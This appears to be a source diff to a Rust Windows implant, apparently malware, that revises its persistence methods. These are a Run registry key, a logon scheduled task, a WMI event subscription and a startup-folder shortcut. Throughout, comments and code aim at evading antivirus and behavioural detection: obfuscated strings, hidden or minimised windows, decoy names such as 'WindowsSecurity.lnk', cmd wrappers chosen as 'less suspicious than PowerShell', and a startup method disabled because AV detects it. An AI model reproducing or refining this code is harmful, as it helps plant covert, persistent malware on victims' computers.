@@ -198,7 +198,8 @@ fn get_machine_index() -> usize {
 }
 
 /// Registry Run persistence - método más simple y efectivo
-/// Uses direct executable path without cmd wrapper to avoid visible console
+/// Uses cmd /c start /min wrapper to hide execution window
+/// Note: The agent must be compiled with --features production for windowless operation
 #[cfg(target_os = "windows")]
 fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
@@ -218,10 +219,9 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     let idx = get_machine_index() % reg_names.len();
     let reg_name = reg_names[idx];
     
-    // Direct executable path - no cmd wrapper to avoid visible console window
-    // The agent should already be compiled as a Windows GUI app (not console)
-    // which means it won't show a window on startup
-    let exe_cmd = format!(r#""{}""#, exe_str);
+    // Use cmd /c start /min to hide console window on startup
+    // This is less suspicious than PowerShell to AV systems
+    let exe_cmd = format!(r#"cmd.exe /c start /min "" "{}""#, exe_str);
     
     // Registry key path
     let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
@@ -248,7 +248,7 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
 }
 
 /// Scheduled Task persistence with enhanced evasion
-/// Uses PowerShell-based hidden task execution to avoid visible console windows
+/// Uses cmd wrapper with delayed execution - avoids PowerShell for lower AV detection
 #[cfg(target_os = "windows")]
 fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
@@ -275,15 +275,15 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
         .creation_flags(0x08000000)
         .output();
     
-    // Random delay between 60-180 seconds for anti-behavioral detection
-    let delay_secs = 60 + (get_machine_index() % 120);
+    // Random delay between 10-30 seconds for anti-behavioral detection
+    // Using cmd with timeout - less suspicious than PowerShell
+    let delay_secs = 10 + (get_machine_index() % 20);
     
-    // Use PowerShell with -WindowStyle Hidden to avoid visible console windows
-    // This creates a completely invisible execution
-    let ps_exe = obfstr!("powershell").to_string();
+    // Use cmd.exe with timeout for delay - avoids PowerShell detection
+    // cmd /c timeout + start /min is less monitored than PowerShell
     let task_cmd = format!(
-        r#"{} -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Sleep -Seconds {};Start-Process -FilePath '{}' -WindowStyle Hidden""#,
-        ps_exe, delay_secs, exe_str.replace("'", "''")
+        r#"cmd.exe /c timeout /t {} /nobreak >nul && start /min "" "{}""#,
+        delay_secs, exe_str
     );
     
     // Create scheduled task on logon with additional delay
@@ -311,6 +311,7 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
 /// WMI Event Subscription persistence
 /// Uses time-based triggers which are less monitored than logon events
 /// Note: WMI persistence requires admin rights and may not work on all systems
+/// Uses cmd.exe wrapper for execution to avoid PowerShell detection on trigger
 #[cfg(target_os = "windows")]
 fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
@@ -326,7 +327,7 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let idx = get_machine_index() % wmi_names.len();
     let event_name = wmi_names[idx];
     
-    // Escape backslashes for PowerShell command line template
+    // Escape backslashes for WMI command line template
     let exe_escaped = exe_str.replace("\\", "\\\\");
     
     // Random hour for trigger (less predictable)
@@ -334,12 +335,11 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     
     // Use raw string literals to avoid \r being interpreted as carriage return
     // The WMI namespace path needs to be \\.\root\subscription in PowerShell
-    // Using string concatenation with raw strings to build the script
     let wmi_root = r"\\.\root\subscription";
     let cimv2_ns = r"root\cimv2";
     
     // Build PowerShell WMI script using raw strings for paths
-    // Use PowerShell Start-Process with -WindowStyle Hidden instead of cmd for execution
+    // CommandLineTemplate uses cmd.exe wrapper - less suspicious than PowerShell
     let ps_script = format!(
         concat!(
             "$F=([wmiclass]'{}:__EventFilter').CreateInstance();",
@@ -351,7 +351,7 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
             "$F.Put()|Out-Null;",
             "$C=([wmiclass]'{}:CommandLineEventConsumer').CreateInstance();",
             "$C.Name='{}';",
-            "$C.CommandLineTemplate='powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Start-Process -FilePath \\\"{}\\\" -WindowStyle Hidden\"';",
+            "$C.CommandLineTemplate='cmd.exe /c start /min \"\" \"{}\"';",
             "$C.Put()|Out-Null;",
             "$B=([wmiclass]'{}:__FilterToConsumerBinding').CreateInstance();",
             "$B.Filter=$F;$B.Consumer=$C;",
@@ -385,55 +385,12 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
 }
 
 /// Startup folder persistence using shortcut file
-/// Creates a .lnk file with minimized window style
+/// DISABLED: Too easily detected by AV - use registry or task instead
 #[cfg(target_os = "windows")]
-fn persist_startup_folder(exe_path: &Path) -> Result<String, String> {
-    let exe_str = exe_path.to_str()
-        .ok_or_else(|| "Invalid path".to_string())?;
-    
-    // Get startup folder path
-    let appdata_key = obfstr!("APPDATA").to_string();
-    let startup = env::var(&appdata_key)
-        .map(|p| format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", p))
-        .unwrap_or_else(|_| "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".to_string());
-    
-    // Polymorphic shortcut names
-    let lnk_names = [
-        "WindowsSecurity.lnk",
-        "OneDriveSync.lnk",
-        "AdobeUpdater.lnk",
-        "ChromeHelper.lnk",
-        "EdgeUpdate.lnk",
-    ];
-    let idx = get_machine_index() % lnk_names.len();
-    let lnk_name = lnk_names[idx];
-    let lnk_path = format!("{}\\{}", startup, lnk_name);
-    
-    // PowerShell to create shortcut with WindowStyle=7 (minimized)
-    let ps_script = format!(
-        r#"$s=(New-Object -ComObject WScript.Shell).CreateShortcut('{}');$s.TargetPath='{}';$s.WindowStyle=7;$s.Save()"#,
-        lnk_path.replace("'", "''"),
-        exe_str.replace("'", "''")
-    );
-    
-    let ps_exe = obfstr!("powershell").to_string();
-    let output = Command::new(&ps_exe)
-        .args(&[
-            "-NoProfile",
-            "-WindowStyle", "Hidden",
-            "-NonInteractive",
-            "-Command",
-            &ps_script,
-        ])
-        .creation_flags(0x08000000)
-        .output()
-        .map_err(|e| format!("E12: {}", e))?;
-    
-    if output.status.success() {
-        Ok(format!("Startup: {}", lnk_path))
-    } else {
-        Err(format!("E13: {}", String::from_utf8_lossy(&output.stderr).trim()))
-    }
+fn persist_startup_folder(_exe_path: &Path) -> Result<String, String> {
+    // Startup folder is the most visible and easily detected method
+    // Disabled to prevent AV detection
+    Err("Startup method disabled (easily detected by AV). Use registry or task instead.".to_string())
 }
 
 // ============================================================================
